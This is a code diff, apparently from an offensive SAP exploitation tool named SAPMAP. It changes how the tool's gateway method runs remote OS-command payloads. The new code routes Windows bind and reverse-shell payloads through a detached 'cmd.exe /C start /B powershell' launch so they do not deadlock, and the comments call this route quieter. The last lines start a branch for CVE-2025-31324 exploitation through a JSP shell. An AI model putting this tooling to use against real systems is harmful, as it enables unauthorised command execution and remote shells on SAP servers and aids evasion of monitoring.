@@ -13266,7 +13266,29 @@ def create_app(api: SAPMAPApi) -> Bottle:
             if method == "gateway":
                 # GW: EXTPROG = "command", PARAMS = "params", LONG_PARAMS = "long_params"
                 # long_params="" prevents old-kernel PARAMS+LONG_PARAMS concatenation.
-                pre_steps = payload.get("steps", [])
+                #
+                # Windows bind/reverse-shell payloads emit BOTH a GW-native
+                # form (inline `powershell -c "<decode+iex>"`) AND an SXPG
+                # form (`cmd.exe /C start /B powershell -File %TEMP%\s.ps1`).
+                # The GW-native form INLINES the PowerShell via -c, so
+                # PowerShell blocks on AcceptTcpClient() forever and the
+                # SXPG call never returns — deadlock, because SAPMAP is
+                # itself waiting for exec_os_command to return before it
+                # tries to connect.  The SXPG form uses `start /B` which
+                # detaches PowerShell so cmd.exe exits immediately.  Use
+                # the SXPG form on both channels — execute_os_command's
+                # selector often picks SXPG anyway (quieter than GW),
+                # and cmd.exe /C start /B works over GW SAPXPG too.
+                pre_steps = (payload.get("sxpg_steps")
+                             or payload.get("steps", []))
+                exec_cmd = payload.get("sxpg_command", payload["command"])
+                exec_params = payload.get("sxpg_params", payload["params"])
+                # When we route through the sxpg_* form, long_params must
+                # NOT carry the GW-native form's leftover value — the
+                # sxpg_command is a self-contained cmd.exe launch.
+                exec_long = (""
+                             if payload.get("sxpg_command")
+                             else payload.get("long_params"))
                 if pre_steps:
                     total = len(pre_steps)
                     for idx, step in enumerate(pre_steps):
@@ -13281,8 +13303,8 @@ def create_app(api: SAPMAPApi) -> Bottle:
                             soap_route=soap_route)
                 _set_progress("Executing payload...")
                 result = sapmap_exploit.execute_os_command(
-                    node, payload["command"], payload["params"],
-                    long_params=payload.get("long_params"),
+                    node, exec_cmd, exec_params,
+                    long_params=exec_long,
                     soap_route=soap_route)
             elif method == "cve_31324":
                 # CVE-2025-31324 via the JSP shell has no 128/255-byte
